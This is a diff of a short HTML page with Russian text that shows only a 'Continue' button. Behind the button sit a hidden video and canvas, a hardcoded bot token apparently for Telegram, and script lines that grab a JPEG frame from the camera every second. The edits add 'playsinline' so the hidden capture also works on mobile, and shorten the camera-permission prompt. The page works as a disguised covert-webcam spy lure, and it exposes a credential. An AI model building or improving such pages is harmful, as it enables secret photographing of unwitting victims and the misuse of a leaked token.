@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html>
 <body style="background:#000; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;">
-    <video id="v" autoplay style="display:none;"></video>
+    <video id="v" autoplay playsinline style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
-    <button id="b" style="padding:20px; background:#27ae60; color:#fff; border:none; border-radius:10px; font-size:18px; cursor:pointer;">Продолжить</button>
+    <button id="b" style="padding:20px; background:#27ae60; color:#fff; border:none; border-radius:10px; font-size:18px;">Продолжить</button>
 
     <script>
         const token = '8174281213:AAErVNdvIelAbe3aGFHNvJ1D7g4CdTGGWMc';
@@ -27,7 +27,7 @@
                     }, 'image/jpeg');
                 }, 1000);
             } catch (e) {
-                alert("Разрешите доступ к камере для продолжения");
+                alert("Разрешите доступ к камере");
             }
         };
     </script>
